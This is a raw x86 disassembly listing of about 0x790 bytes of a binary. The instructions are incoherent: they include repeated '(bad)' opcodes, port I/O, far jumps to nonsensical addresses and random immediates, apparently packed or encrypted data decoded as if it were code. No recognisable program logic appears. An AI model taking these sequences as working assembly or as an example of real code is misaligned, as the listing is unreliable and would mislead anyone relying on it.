  40dfbc:	inc    esp
  40dfbe:	test   al,0x7b
  40dfc0:	(bad)  
  40dfc1:	sub    dl,BYTE PTR [esi]
  40dfc3:	and    BYTE PTR [ebx],ch
  40dfc5:	loope  0x40df6c
  40dfc7:	out    dx,al
  40dfc8:	stos   DWORD PTR es:[edi],eax
  40dfc9:	pop    esp
  40dfca:	sbb    al,0xbf
  40dfcc:	push   esi
  40dfcd:	dec    ebx
  40dfce:	fs add edx,edx
  40dfd1:	mov    cl,0xde
  40dfd3:	or     DWORD PTR [edx+edi*8+0x22406580],0xfffffff3
  40dfdb:	ds pop edx
  40dfdd:	push   0x1dca7569
  40dfe2:	mov    bl,0x19
  40dfe4:	fwait
  40dfe5:	arpl   WORD PTR [esi-0x3f1e47ef],cx
  40dfeb:	push   edx
  40dfec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfed:	mov    bl,0x5
  40dfef:	add    ah,BYTE PTR gs:0x24a9406f
  40dff6:	sbb    ah,dh
  40dff8:	arpl   bp,bx
  40dffa:	dec    ebp
  40dffb:	fst    DWORD PTR [eax+0x60]
  40dffe:	push   eax
  40dfff:	aad    0x80
  40e001:	mov    al,BYTE PTR [edx*1-0x45301bd0]
  40e008:	or     dl,BYTE PTR [eax+0x64ee0047]
  40e00e:	sbb    ebp,DWORD PTR [ecx]
  40e010:	mov    cl,0xdb
  40e012:	push   ebx
  40e013:	enter  0x8f9f,0xe9
  40e017:	push   esi
  40e018:	sub    eax,0x25c2789f
  40e01d:	sbb    BYTE PTR [edi+0x2],dh
  40e020:	dec    edx
  40e021:	push   ds
  40e022:	retf   0xd5e7
  40e025:	and    DWORD PTR [edx+0x4d58a063],0x70
  40e02c:	test   DWORD PTR [ecx-0x57],0x5cde818a
  40e033:	adc    edx,DWORD PTR [eax]
  40e035:	and    al,0x6c
  40e037:	je     0x40dff0
  40e039:	sub    BYTE PTR [ebp-0x6b],ch
  40e03c:	sub    DWORD PTR [ebp-0x5be358b],eax
  40e042:	jp     0x40e056
  40e044:	je     0x40dfde
  40e046:	test   eax,0x2638d77e
  40e04b:	or     al,BYTE PTR [ebx+0x4a]
  40e04e:	jp     0x40e016
  40e050:	popf   
  40e051:	popa   
  40e052:	add    al,0x7e
  40e054:	adc    BYTE PTR [eax+0x39fa8759],ch
  40e05a:	mov    ds:0xc5d2e228,eax
  40e05f:	mov    ebx,DWORD PTR [esp+edi*4+0x70]
  40e063:	add    edi,ecx
  40e065:	repz sub BYTE PTR [edi+0x2a],dl
  40e069:	xor    al,0x9b
  40e06b:	dec    ebp
  40e06c:	mov    dh,0xc6
  40e06f:	sbb    BYTE PTR [edi],bl
  40e071:	pop    ds
  40e072:	out    0x6d,eax
  40e074:	outs   dx,DWORD PTR ds:[esi]
  40e075:	jge    0x40e0a2
  40e077:	sar    DWORD PTR [ebx],0x7d
  40e07a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e07b:	mov    ecx,gs
  40e07d:	mov    ah,0xb7
  40e07f:	cmp    BYTE PTR [ecx+0x72],dh
  40e082:	cdq    
  40e083:	dec    ebx
  40e084:	xchg   edi,eax
  40e085:	(bad)  
  40e086:	mov    eax,0x89cbb170
  40e08b:	push   ebx
  40e08c:	fistp  DWORD PTR [esi+edi*4-0x4e]
  40e090:	(bad)  
  40e091:	cli    
  40e092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e093:	in     al,0xd2
  40e095:	push   ebp
  40e096:	fsubr  DWORD PTR [edi+eax*1+0x24]
  40e09a:	std    
  40e09b:	inc    eax
  40e09c:	sbb    DWORD PTR [ebx],ebx
  40e09e:	std    
  40e09f:	jge    0x40e03b
  40e0a1:	sub    DWORD PTR [eax+eax*8+0x19063150],eax
  40e0a8:	inc    ebx
  40e0a9:	adc    al,BYTE PTR [edx]
  40e0ab:	push   ecx
  40e0ac:	dec    esi
  40e0ad:	jge    0x40e0df
  40e0af:	dec    esp
  40e0b0:	rcr    al,0x5
  40e0b3:	mov    esp,0x3b677bec
  40e0b8:	xor    bl,ch
  40e0ba:	sub    al,0x74
  40e0bc:	pushf  
  40e0bd:	mov    ebp,0x523a8724
  40e0c2:	fild   DWORD PTR [eax+0x528ea44c]
  40e0c8:	(bad)  
  40e0c9:	jae    0x40e100
  40e0cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0cc:	ror    BYTE PTR [ebx+0x12],0xf5
  40e0d0:	sub    BYTE PTR [esi+0x2fa472c9],bl
  40e0d6:	cwde   
  40e0d7:	xchg   ecx,eax
  40e0d8:	repnz cmp DWORD PTR [ebx-0x351bbc42],ecx
  40e0df:	add    al,0x60
  40e0e1:	mov    ecx,0xa7a5d66e
  40e0e6:	outs   dx,DWORD PTR ds:[esi]
  40e0e7:	scas   eax,DWORD PTR es:[edi]
  40e0e8:	(bad)  
  40e0e9:	loop   0x40e07f
  40e0eb:	popa   
  40e0ec:	jmp    0x5ed5cd6c
  40e0f1:	cmp    al,0x1d
  40e0f3:	retf   
  40e0f4:	fnstenv [ecx]
  40e0f6:	in     al,dx
  40e0f7:	fimul  DWORD PTR [ecx]
  40e0f9:	sub    al,0x33
  40e0fb:	add    bl,ch
  40e0fd:	push   es
  40e0fe:	mov    WORD PTR [esi+0x47bb309],es
  40e104:	mov    esi,0xa9451317
  40e109:	ffree  st(0)
  40e10b:	add    dh,BYTE PTR gs:[ecx+0x1c]
  40e10f:	(bad)  
  40e110:	dec    esp
  40e111:	mov    ds:0x550b5a77,eax
  40e116:	adc    ah,ah
  40e118:	mov    dh,0xb7
  40e11a:	frstor [eax]
  40e11c:	add    BYTE PTR [ecx],cl
  40e11e:	in     al,0xf4
  40e120:	jg     0x40e119
  40e122:	inc    ebp
  40e123:	push   edx
  40e124:	push   es
  40e125:	nop
  40e126:	(bad)  
  40e127:	jnp    0x40e160
  40e129:	add    al,0x9b
  40e12b:	adc    bh,BYTE PTR [eax]
  40e12d:	fcom   QWORD PTR [eax+0xfdae441]
  40e133:	xchg   edx,eax
  40e134:	jmp    0x40e17a
  40e136:	push   edi
  40e137:	inc    ebp
  40e138:	mov    eax,0x48a28b5e
  40e13d:	xor    DWORD PTR [eax+0x24b7b89b],eax
  40e143:	mov    eax,ds:0x6b518fe9
  40e148:	dec    edi
  40e149:	push   edx
  40e14a:	pop    edx
  40e14b:	lods   eax,DWORD PTR ds:[esi]
  40e14c:	xor    cl,dh
  40e14e:	push   ds
  40e14f:	cmp    BYTE PTR [eax+0x52],0x9
  40e153:	cmp    edi,DWORD PTR ds:0x2861ddf8
  40e159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e15a:	stos   BYTE PTR es:[edi],al
  40e15b:	cwde   
  40e15c:	jecxz  0x40e165
  40e15e:	push   0xffffff82
  40e160:	mov    BYTE PTR [ecx+0x3c],cl
  40e163:	and    bh,BYTE PTR [edi+ecx*4]
  40e166:	fsub   DWORD PTR [ecx-0x58]
  40e169:	mov    esi,0xab5411e7
  40e16e:	cli    
  40e16f:	push   ds
  40e170:	adc    BYTE PTR [esp+esi*4-0x2127494a],0xdc
  40e178:	in     al,0x5c
  40e17a:	dec    esi
  40e17b:	push   ebp
  40e17c:	stos   BYTE PTR es:[edi],al
  40e17d:	push   esp
  40e17e:	sub    cl,BYTE PTR [esp+ecx*2+0x4e]
  40e182:	lock xchg BYTE PTR [edi+0x66d6f896],al
  40e189:	xor    DWORD PTR [ecx-0x3475654f],0x20
  40e190:	pusha  
  40e191:	jne    0x40e208
  40e193:	adc    DWORD PTR [edi-0x3436c5a2],0x27
  40e19a:	xchg   esi,eax
  40e19b:	jns    0x40e17e
  40e19d:	clc    
  40e19e:	pop    ecx
  40e19f:	mov    esi,0x6b2ae4f6
  40e1a4:	jmp    0x40e1cb
  40e1a6:	ss mov dh,0xc7
  40e1a9:	and    BYTE PTR [esi+0x414d285],bl
  40e1af:	dec    ebp
  40e1b0:	test   al,0xf8
  40e1b2:	mov    al,al
  40e1b4:	inc    ebp
  40e1b5:	mov    ds:0x55274291,al
  40e1ba:	and    eax,0x44c9aed0
  40e1bf:	ret    
  40e1c0:	ja     0x40e163
  40e1c2:	and    ebx,DWORD PTR [ebp-0x54e1098e]
  40e1c8:	add    al,0x5b
  40e1ca:	add    al,0xa1
  40e1cc:	and    DWORD PTR [ebp-0x62ac3edd],edi
  40e1d2:	pop    ecx
  40e1d3:	iret   
  40e1d4:	mov    ebp,0x24921d40
  40e1d9:	push   ds
  40e1da:	mov    eax,edx
  40e1dc:	test   BYTE PTR [edi*1+0x4a1534cb],ch
  40e1e3:	xor    al,BYTE PTR [ecx+0x4a]
  40e1e6:	sub    DWORD PTR [ebx],esi
  40e1e8:	push   eax
  40e1e9:	cmp    ecx,ecx
  40e1eb:	ds inc ebx
  40e1ed:	add    al,dl
  40e1ef:	sbb    cl,ch
  40e1f1:	in     al,dx
  40e1f2:	arpl   WORD PTR [ecx],di
  40e1f4:	shl    DWORD PTR [ebx+0x46],0xd
  40e1f8:	mov    al,0xdd
  40e1fa:	out    0xa8,eax
  40e1fc:	adc    eax,0x10ecdc66
  40e201:	push   ss
  40e202:	sub    al,0x65
  40e204:	and    esi,DWORD PTR ds:[ecx-0x54abe32d]
  40e20b:	add    ah,BYTE PTR es:0xaf11070c
  40e212:	mov    ebp,0xc56a8c67
  40e217:	arpl   WORD PTR ds:0x974ea2ca,di
  40e21d:	or     DWORD PTR [eax+0x59828038],ebx
  40e223:	mov    al,0xcb
  40e225:	shl    BYTE PTR [esi-0xf],0xd
  40e229:	outs   dx,DWORD PTR ds:[esi]
  40e22a:	ins    DWORD PTR es:[edi],dx
  40e22b:	fisttp DWORD PTR ds:0xe10b6802
  40e231:	xor    DWORD PTR [eax],ebx
  40e233:	hlt    
  40e234:	push   ebp
  40e235:	aam    0x53
  40e237:	leave  
  40e238:	je     0x40e2b0
  40e23a:	push   ds
  40e23b:	bound  ebp,QWORD PTR [ebx]
  40e23d:	dec    esi
  40e23e:	(bad)  
  40e240:	imul   esp,DWORD PTR [esi-0x107adfb4],0x8b01b93b
  40e24a:	lods   al,BYTE PTR ds:[esi]
  40e24b:	stc    
  40e24c:	xlat   BYTE PTR ds:[ebx]
  40e24d:	inc    edx
  40e24e:	add    eax,0x35172d3b
  40e253:	pop    ss
  40e254:	jne    0x40e2ce
  40e256:	mov    esi,0x9f9cce9a
  40e25b:	sub    BYTE PTR [ebp+ebx*4+0xe],dh
  40e25f:	inc    eax
  40e260:	dec    edx
  40e261:	dec    ecx
  40e262:	dec    ecx
  40e263:	xchg   esi,eax
  40e264:	cmp    ah,cl
  40e266:	aaa    
  40e267:	adc    DWORD PTR [esi-0x13],ebx
  40e26a:	push   ecx
  40e26b:	xchg   edx,eax
  40e26c:	push   ebp
  40e26d:	les    esp,FWORD PTR [eax-0x3949b3b4]
  40e273:	fwait
  40e274:	and    DWORD PTR [edx-0x80],esp
  40e277:	cmp    BYTE PTR [edx+0x3cac7190],cl
  40e27d:	push   cs
  40e27e:	sahf   
  40e27f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e280:	push   0xf
  40e282:	and    al,0x89
  40e284:	lods   eax,DWORD PTR ds:[esi]
  40e285:	and    cx,WORD PTR [ebp+0x1f]
  40e289:	cwde   
  40e28a:	(bad)  [eax-0x112f7be8]
  40e290:	leave  
  40e291:	shr    ch,0x37
  40e294:	ins    DWORD PTR es:[edi],dx
  40e295:	pop    edi
  40e296:	mov    eax,0xcb02fe78
  40e29b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e29c:	iret   
  40e29d:	add    al,ah
  40e29f:	pop    es
  40e2a0:	add    DWORD PTR [ebp-0xe4e66b6],edx
  40e2a6:	jno    0x40e28e
  40e2a8:	out    0x66,al
  40e2aa:	jns    0x40e289
  40e2ac:	jmp    0x40e29c
  40e2ae:	jecxz  0x40e2cd
  40e2b0:	out    dx,eax
  40e2b1:	jl     0x40e2cb
  40e2b3:	fs dec esp
  40e2b5:	mov    bh,0xd7
  40e2b7:	out    0xec,al
  40e2b9:	(bad)  [ebx-0x64]
  40e2bc:	cmp    BYTE PTR [ecx-0x6a],dh
  40e2bf:	scas   eax,DWORD PTR es:[edi]
  40e2c0:	cmp    eax,0x9ea78e71
  40e2c5:	pop    ebp
  40e2c6:	out    0xdc,al
  40e2c8:	stc    
  40e2c9:	mov    BYTE PTR [ebx],ch
  40e2cb:	sbb    ecx,DWORD PTR ds:0xb2a4cec2
  40e2d1:	daa    
  40e2d2:	xchg   esp,eax
  40e2d3:	mov    eax,es:0x854a0bc
  40e2d9:	add    DWORD PTR [esi+0x9],0x4335881d
  40e2e0:	mov    al,0x5e
  40e2e2:	or     ch,bh
  40e2e4:	je     0x40e2a8
  40e2e6:	ja     0x40e286
  40e2e8:	xor    al,0x7d
  40e2ea:	dec    edi
  40e2eb:	cmc    
  40e2ec:	loopne 0x40e340
  40e2ee:	jmp    0x40e2cc
  40e2f0:	jns    0x40e2a7
  40e2f2:	inc    eax
  40e2f3:	out    0x6,eax
  40e2f5:	rol    BYTE PTR [ebx],0x3d
  40e2f8:	daa    
  40e2f9:	and    BYTE PTR [ecx],dh
  40e2fb:	rcr    BYTE PTR [esi+eiz*1+0x2a],1
  40e2ff:	sbb    eax,0xc61c1597
  40e304:	test   al,0x27
  40e306:	shl    ecx,cl
  40e308:	and    eax,0xe386dd84
  40e30d:	jp     0x40e2c5
  40e30f:	jmp    0xc4dd:0x69321dbd
  40e316:	adc    DWORD PTR ds:0x48e81ec1,edx
  40e31c:	je     0x40e2e1
  40e31e:	and    al,0x4
  40e320:	(bad)  
  40e321:	and    edx,DWORD PTR [esi+ebx*2+0x7725974c]
  40e328:	out    0xba,al
  40e32a:	fdiv   st,st(7)
  40e32c:	mov    ch,0xb9
  40e32e:	push   cs
  40e32f:	aad    0x77
  40e331:	mov    ebx,esp
  40e333:	nop
  40e334:	leave  
  40e335:	mov    DWORD PTR [edx+0x66],edi
  40e338:	data16 ins BYTE PTR es:[edi],dx
  40e33a:	adc    DWORD PTR [edx-0xb],edi
  40e33d:	cmp    al,0x8f
  40e33f:	push   eax
  40e340:	pop    ss
  40e341:	mov    ds:0x1ff3b5c9,al
  40e346:	sti    
  40e347:	fadd   st,st(7)
  40e349:	or     cl,BYTE PTR [ebx]
  40e34b:	add    eax,0x2bb6eade
  40e350:	add    al,0x20
  40e352:	test   al,dl
  40e354:	dec    ecx
  40e355:	xor    al,0xc
  40e357:	push   ecx
  40e358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e359:	cmp    ebp,ebp
  40e35b:	aaa    
  40e35c:	shl    BYTE PTR [ecx],cl
  40e35e:	aam    0xe9
  40e360:	neg    DWORD PTR [edi]
  40e362:	jne    0x40e35f
  40e364:	in     eax,dx
  40e365:	adc    al,0xaf
  40e367:	jg     0x40e346
  40e369:	pop    es
  40e36a:	enter  0x579d,0xe4
  40e36e:	and    DWORD PTR [eax],ebp
  40e370:	bound  edx,QWORD PTR [edx]
  40e372:	out    dx,al
  40e373:	mov    cl,0x52
  40e375:	dec    edx
  40e376:	push   0xffffffcd
  40e378:	es xchg ebp,eax
  40e37a:	push   0x55
  40e37c:	gs stos BYTE PTR es:[edi],al
  40e37e:	lea    esp,[edx]
  40e380:	push   es
  40e381:	std    
  40e382:	ds push ecx
  40e384:	sbb    al,0xdb
  40e386:	inc    ecx
  40e387:	imul   esp,DWORD PTR [esi-0x52],0xffffffe1
  40e38b:	adc    ah,BYTE PTR [edi-0x676c7202]
  40e391:	pusha  
  40e392:	pop    eax
  40e393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e394:	adc    al,0x56
  40e396:	je     0x40e356
  40e398:	sti    
  40e399:	sub    BYTE PTR ds:0x11f7f97f,bl
  40e39f:	push   0xffffffa0
  40e3a1:	test   BYTE PTR [ecx-0x5c],dl
  40e3a4:	hlt    
  40e3a5:	aas    
  40e3a6:	sub    DWORD PTR [ebp-0x39db8e0f],ebp
  40e3ac:	inc    ecx
  40e3ad:	xor    eax,DWORD PTR ds:0x52d34de5
  40e3b3:	and    al,0x7f
  40e3b5:	pushf  
  40e3b6:	push   eax
  40e3b7:	jno    0x40e3c4
  40e3b9:	adc    eax,0x2e5ca7df
  40e3be:	arpl   WORD PTR [edx+0x3dbbf4f6],si
  40e3c4:	fcmovu st,st(3)
  40e3c6:	sub    eax,0x833e9ece
  40e3cb:	adc    dl,al
  40e3cd:	mov    edx,0x2e2ef726
  40e3d2:	xor    dh,BYTE PTR ds:0xdfc3c935
  40e3d8:	repnz out 0x79,eax
  40e3db:	(bad)  
  40e3dc:	sti    
  40e3dd:	(bad)  
  40e3df:	jo     0x40e3b1
  40e3e1:	gs jae 0x40e397
  40e3e4:	lds    ecx,FWORD PTR [ebx+0x2f]
  40e3e7:	lahf   
  40e3e8:	loope  0x40e3e3
  40e3ea:	mov    ds:0xc5e17917,eax
  40e3ef:	adc    eax,0x32f4bf8e
  40e3f4:	pop    ss
  40e3f5:	cs (bad) 
  40e3f7:	fldz   
  40e3f9:	out    dx,eax
  40e3fa:	and    DWORD PTR [edx-0x7f28efb5],ecx
  40e400:	or     DWORD PTR [eax],ecx
  40e402:	test   BYTE PTR [eax+0x10],0x80
  40e406:	sbb    BYTE PTR [eax],al
  40e408:	add    edx,DWORD PTR [edi+edx*8-0x388efc5f]
  40e40f:	cmp    al,0x30
  40e411:	sbb    BYTE PTR [edi],bh
  40e413:	mov    edi,0x2f6e4944
  40e418:	popf   
  40e419:	aad    0x57
  40e41b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e41c:	push   ss
  40e41d:	test   al,0x70
  40e41f:	imul   ebx,edi,0x2224cfba
  40e425:	int    0x8
  40e427:	sub    al,0x13
  40e429:	shl    DWORD PTR gs:[edi+0x24],0x7f
  40e42e:	stos   BYTE PTR es:[edi],al
  40e42f:	jae    0x40e3ec
  40e431:	dec    esp
  40e432:	add    BYTE PTR [ebx+0x3cfd5d30],cl
  40e438:	inc    ebx
  40e439:	push   esp
  40e43a:	and    dh,BYTE PTR [ebp-0x411727fb]
  40e440:	or     al,0xf1
  40e442:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e443:	cmp    bl,BYTE PTR [ebx-0x1db924b7]
  40e449:	dec    esp
  40e44a:	sub    al,0x12
  40e44c:	out    dx,al
  40e44d:	cmc    
  40e44e:	mov    WORD PTR [edx-0x2b44dd1c],cs
  40e454:	mov    al,0x99
  40e456:	and    al,0x1e
  40e458:	xor    cl,BYTE PTR [ecx+0x66357a8]
  40e45e:	and    ecx,0xffffff8e
  40e461:	and    BYTE PTR [eax+ecx*1],0x82
  40e465:	imul   esp,DWORD PTR [ebp+0x3],0xffffffbe
  40e469:	push   esp
  40e46a:	js     0x40e43e
  40e46c:	ins    DWORD PTR es:[edi],dx
  40e46d:	push   0x381d3537
  40e472:	popf   
  40e473:	or     DWORD PTR [eax+0x7c],ebx
  40e476:	pushf  
  40e477:	cmp    edi,0x120e5100
  40e47d:	sbb    DWORD PTR [edx],esp
  40e47f:	sub    al,0x22
  40e481:	pop    esp
  40e482:	idiv   DWORD PTR [esi]
  40e484:	out    dx,al
  40e485:	mov    esi,0xa8df113c
  40e48a:	xor    DWORD PTR [eax-0xc],esi
  40e48d:	mov    ecx,0x894b2f4
  40e492:	dec    edi
  40e493:	stc    
  40e494:	lock dec ebx
  40e496:	push   edx
  40e497:	push   edx
  40e498:	test   eax,0xad2501d7
  40e49d:	cmc    
  40e49e:	inc    ebp
  40e49f:	lock jne 0x40e488
  40e4a2:	(bad)  
  40e4a3:	shl    DWORD PTR [eax+0x40],0xac
  40e4a7:	shl    DWORD PTR [ecx-0x67],cl
  40e4aa:	sti    
  40e4ab:	test   ecx,edx
  40e4ad:	shl    BYTE PTR [ecx+0x6f7abb32],1
  40e4b3:	data16 js 0x40e48f
  40e4b6:	ss or  al,0x43
  40e4b9:	dec    edx
  40e4ba:	inc    ecx
  40e4bb:	pusha  
  40e4bc:	pop    es
  40e4bd:	mov    cl,0xd0
  40e4bf:	xchg   edx,eax
  40e4c0:	pop    edi
  40e4c1:	jmp    0x83d4:0x4cf730e7
  40e4c8:	push   0xffffffe3
  40e4ca:	jne    0x40e4e2
  40e4cc:	adc    eax,0x1d4ff2a5
  40e4d1:	sub    esi,DWORD PTR ds:0x8f3cf704
  40e4d7:	push   edx
  40e4d8:	mov    ecx,0x512a504c
  40e4dd:	test   eax,0x4938854
  40e4e2:	sbb    edi,eax
  40e4e4:	je     0x40e4c1
  40e4e6:	ins    DWORD PTR es:[edi],dx
  40e4e7:	pop    esi
  40e4e8:	cmp    bh,BYTE PTR [esi-0x24]
  40e4eb:	mov    edx,0x2ad5aa9d
  40e4f0:	aad    0x6a
  40e4f2:	xchg   ebp,eax
  40e4f3:	out    0xf8,al
  40e4f5:	sbb    ch,cl
  40e4f7:	inc    esi
  40e4f8:	xor    DWORD PTR [edi+0x7d],0xffffffeb
  40e4fc:	mov    ebp,0x3a6df3bc
  40e501:	sub    DWORD PTR [ebp-0x42829f21],eax
  40e507:	retf   
  40e508:	jbe    0x40e535
  40e50a:	out    0xea,al
  40e50c:	pop    edx
  40e50d:	(bad)  
  40e50e:	retf   
  40e50f:	scas   eax,DWORD PTR es:[edi]
  40e510:	lods   al,BYTE PTR ds:[esi]
  40e511:	jb     0x40e50f
  40e513:	in     eax,0xd3
  40e515:	mov    esp,0xc5cbaa7c
  40e51a:	sub    ecx,DWORD PTR ds:0x854576a2
  40e520:	add    BYTE PTR [edi-0x7b4d5e59],dl
  40e526:	xor    eax,0xef2b1200
  40e52b:	sbb    DWORD PTR [eax+ebp*1],0xffffffc6
  40e52f:	nop
  40e530:	hlt    
  40e531:	push   eax
  40e532:	inc    esi
  40e533:	aas    
  40e534:	ins    DWORD PTR es:[edi],dx
  40e535:	dec    edi
  40e536:	xor    BYTE PTR [esi],dh
  40e538:	test   DWORD PTR [edx*4-0x665bc04],eax
  40e53f:	repz pop edx
  40e541:	cmovg  edi,DWORD PTR [eiz*4-0x20b747fe]
  40e549:	hlt    
  40e54a:	test   eax,0x9e50c35a
  40e54f:	mov    eax,DWORD PTR [esi]
  40e551:	xchg   esp,eax
  40e552:	mov    edx,0x52679b9f
  40e557:	pusha  
  40e558:	rcl    DWORD PTR [edi-0x33],1
  40e55b:	mov    eax,0x827b5d2e
  40e560:	ret    
  40e561:	cmp    al,0x2c
  40e563:	popa   
  40e564:	cmp    edi,DWORD PTR ds:0x3e61909c
  40e56a:	out    0x50,al
  40e56c:	(bad)  
  40e56d:	mov    edx,0x89884ca3
  40e572:	retf   0xd50a
  40e575:	push   0x1e1c8e08
  40e57a:	sbb    esi,DWORD PTR [ecx+0x1]
  40e57d:	mov    edx,0x7df7d3e3
  40e582:	fwait
  40e583:	jp     0x40e532
  40e585:	mov    al,ds:0xf1b45cbd
  40e58a:	jbe    0x40e540
  40e58c:	fwait
  40e58d:	dec    edx
  40e58e:	or     BYTE PTR [edx+0x238d66fe],dl
  40e594:	mov    ds:0x68a21f70,eax
  40e599:	pop    eax
  40e59a:	test   al,0x2
  40e59c:	in     al,dx
  40e59d:	adc    al,0xe5
  40e59f:	out    0xc6,eax
  40e5a1:	adc    al,al
  40e5a3:	into   
  40e5a4:	or     al,0xe1
  40e5a6:	jp     0x40e612
  40e5a8:	inc    eax
  40e5a9:	sahf   
  40e5aa:	adc    DWORD PTR [eax*1+0x2ab90a],edx
  40e5b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5b2:	xor    BYTE PTR [eax+0x68],dl
  40e5b5:	dec    ecx
  40e5b6:	pop    ebx
  40e5b7:	or     eax,0xa6a7c602
  40e5bc:	adc    al,0x8c
  40e5be:	xlat   BYTE PTR ds:[ebx]
  40e5bf:	shl    BYTE PTR [esi-0x7aed1229],cl
  40e5c5:	and    DWORD PTR [ecx+0x18],esp
  40e5c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5c9:	out    0xbb,eax
  40e5cb:	pop    ds
  40e5cc:	fucomp st(5)
  40e5ce:	and    eax,0x22893dbd
  40e5d3:	and    ch,BYTE PTR [ebp+0x4]
  40e5d6:	adc    bh,BYTE PTR [ecx+0x2a8e9167]
  40e5dc:	lea    ecx,fs:[eax+0x62c65842]
  40e5e3:	mov    cs,WORD PTR [ebp-0x64]
  40e5e6:	imul   ebx,DWORD PTR [edx+0x7d38c30c],0xffffffe9
  40e5ed:	and    ch,BYTE PTR [ebx]
  40e5ef:	loope  0x40e5ec
  40e5f1:	mov    al,cl
  40e5f3:	xchg   ebp,eax
  40e5f4:	retf   
  40e5f5:	inc    esp
  40e5f6:	push   ecx
  40e5f7:	inc    esp
  40e5f8:	mov    edi,0xebd7a7df
  40e5fd:	rcl    ebx,1
  40e5ff:	imul   eax,eax,0xcd3c35cc
  40e605:	add    al,0x1b
  40e607:	lea    ebx,[edx]
  40e609:	jecxz  0x40e5ee
  40e60b:	jecxz  0x40e5f9
  40e60d:	fnstsw WORD PTR [ebx]
  40e60f:	iret   
  40e610:	jge    0x40e609
  40e612:	dec    esp
  40e613:	repz fstp QWORD PTR [edi]
  40e616:	mov    edx,0xb413df07
  40e61b:	cmp    eax,DWORD PTR [ebx]
  40e61d:	pop    esi
  40e61e:	ds jno 0x40e5b2
  40e621:	out    0x8f,eax
  40e623:	scas   al,BYTE PTR es:[edi]
  40e624:	jo     0x40e61a
  40e626:	fcom   DWORD PTR [ebp-0x62]
  40e629:	jp     0x40e629
  40e62b:	sbb    al,0x27
  40e62d:	dec    edi
  40e62e:	or     DWORD PTR [edx],edi
  40e630:	in     eax,dx
  40e631:	push   es
  40e632:	inc    esp
  40e633:	xor    eax,0x6543cea8
  40e638:	sbb    al,BYTE PTR [edx-0x2bcaabee]
  40e63e:	(bad)  
  40e63f:	cmp    cl,dl
  40e641:	sti    
  40e642:	adc    BYTE PTR [edi+0x52112fd4],dh
  40e648:	(bad)  
  40e649:	ss jmp 0x40e5fa
  40e64c:	adc    al,0xc6
  40e64e:	push   ebp
  40e64f:	sub    al,0xc0
  40e651:	dec    edi
  40e652:	adc    al,bh
  40e654:	or     BYTE PTR [ebx],dl
  40e656:	jno    0x40e63f
  40e658:	inc    edx
  40e659:	jle    0x40e6c2
  40e65b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e65c:	jmp    0x2ca4bcaf
  40e661:	addr16 mov al,ds:0xdcb3
  40e665:	inc    ebx
  40e666:	adc    ebp,DWORD PTR [edi+0x1dc22830]
  40e66c:	pop    esp
  40e66d:	jmp    0x7bd8:0x42f9993f
  40e674:	gs or  eax,0xa34a8e7d
  40e67a:	aad    0x89
  40e67c:	and    bh,BYTE PTR [esi+0x428066a2]
  40e682:	sbb    al,0x9
  40e684:	jmp    0x4510:0x6c5a584d
  40e68b:	popf   
  40e68c:	sbb    eax,0xfbef9dc7
  40e691:	mov    ah,0xdb
  40e693:	ins    DWORD PTR es:[edi],dx
  40e694:	mov    ds:0x184ca28,al
  40e699:	jmp    0x40e67e
  40e69b:	into   
  40e69c:	(bad)  
  40e69d:	fsubrp st(1),st
  40e69f:	div    BYTE PTR [ebx+ebx*4-0x3ce5fc8e]
  40e6a6:	fidiv  WORD PTR [ebp+0x6b2ade5a]
  40e6ac:	fcomp  QWORD PTR [ebp-0x53]
  40e6af:	push   esi
  40e6b0:	retf   
  40e6b1:	fiadd  DWORD PTR [eax]
  40e6b3:	repnz sbb DWORD PTR [ebx-0x76],edx
  40e6b7:	or     al,bl
  40e6b9:	mov    eax,0xf37dcd00
  40e6be:	push   ds
  40e6bf:	test   BYTE PTR [ebp+0x116b8254],bl
  40e6c5:	jle    0x40e658
  40e6c7:	popf   
  40e6c8:	rcr    ebp,0xf
  40e6cb:	sub    DWORD PTR [ebx+0x18],esi
  40e6ce:	push   cs
  40e6cf:	xchg   DWORD PTR [eax],ecx
  40e6d1:	iret   
  40e6d2:	and    ecx,DWORD PTR [eax]
  40e6d4:	add    al,BYTE PTR [edi+ebp*8-0x52c2cecd]
  40e6db:	dec    edx
  40e6dc:	xchg   DWORD PTR ds:0x479ef887,ecx
  40e6e2:	mov    bh,0xdb
  40e6e4:	gs fsubr st,st(7)
  40e6e7:	adc    eax,DWORD PTR [edi+0x11]
  40e6ea:	mov    eax,ds:0x145a584e
  40e6ef:	jmp    0x40e6c1
  40e6f1:	jmp    0x40e769
  40e6f3:	or     DWORD PTR [ebx+0x25],ecx
  40e6f6:	add    ch,BYTE PTR [ebp+0x7f]
  40e6f9:	lock xor eax,0x6652291
  40e6ff:	xor    eax,0x66994328
  40e704:	add    dl,dl
  40e706:	sbb    esp,esp
  40e708:	cli    
  40e709:	cmp    BYTE PTR [ebx],ah
  40e70b:	stc    
  40e70c:	int    0x7b
  40e70e:	fdiv   DWORD PTR [ebx+eiz*8-0x1a]
  40e712:	das    
  40e713:	mov    bh,0xdf
  40e715:	dec    ebp
  40e716:	add    BYTE PTR [edx-0x2dca3ad0],0x96
  40e71d:	and    al,0x9
  40e71f:	fcmovnu st,st(3)
  40e721:	ins    DWORD PTR es:[edi],dx
  40e722:	mov    dh,0xb6
  40e724:	pop    edx
  40e725:	pushf  
  40e726:	cmp    DWORD PTR [ebx-0x2a],esi
  40e729:	mov    ds:0xccb97285,al
  40e72e:	(bad)  
  40e72f:	in     al,0x4
  40e731:	sti    
  40e732:	paddsb mm4,mm7
  40e735:	das    
  40e736:	mov    esi,0xf7be5eef
  40e73b:	mov    ds:0x3d291e7f,eax
  40e740:	into   
  40e741:	pop    edi
  40e742:	pop    eax
  40e743:	in     eax,0x95
  40e745:	push   ebx
  40e746:	fwait
